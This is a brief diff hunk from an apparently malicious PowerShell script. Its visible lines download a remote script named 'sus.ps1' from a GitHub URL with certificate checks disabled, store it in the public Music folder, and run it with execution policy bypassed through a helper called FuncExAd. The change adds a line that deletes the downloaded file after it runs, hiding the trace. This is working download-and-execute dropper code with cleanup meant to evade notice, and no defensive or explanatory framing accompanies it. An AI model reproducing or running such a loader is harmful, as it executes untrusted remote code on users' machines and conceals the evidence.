@@ -76,5 +76,4 @@ curl.exe -k -L "https://github.com/jecoma/basco/raw/refs/heads/main/sus.ps1" -o 
 $stringPath='powershell.exe';
 $argPath='-ep bypass -file c:\users\public\music\sus.ps1';
 FuncExAd -src $stringPath -arg $argPath;
-
-
+remove-item c:\users\public\music\sus.ps1;
